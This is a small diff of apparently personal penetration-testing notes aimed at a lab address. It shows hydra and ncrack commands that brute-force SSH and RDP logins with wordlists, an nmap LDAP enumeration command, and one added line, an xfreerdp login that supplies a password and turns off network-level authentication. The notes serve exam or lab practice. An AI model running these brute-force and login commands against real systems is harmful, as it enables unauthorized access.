@@ -100,6 +100,7 @@ hydra -f -V -I -t 50 -l bob -P $rockyou 192.168.200.5 ssh -s 22022
 rdesktop -u guest -p guest 192.168.200.5 -g 94%   ..Login to learn OS
 hydra -t 1 -V -f -l users.txt -P $commontenk rdp://192.168.200.5
 ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://192.168.200.5
+xfreerdp /v:192.168.200.5 /d:mike.com /u:bob /p:paxxword -sec-nla +clipboard /geometry /w:1680 /h:900
 
 # LDAP
 nmap -n -sV --script "ldap* and not brute" 192.168.200.5 | tee nmap-ldap
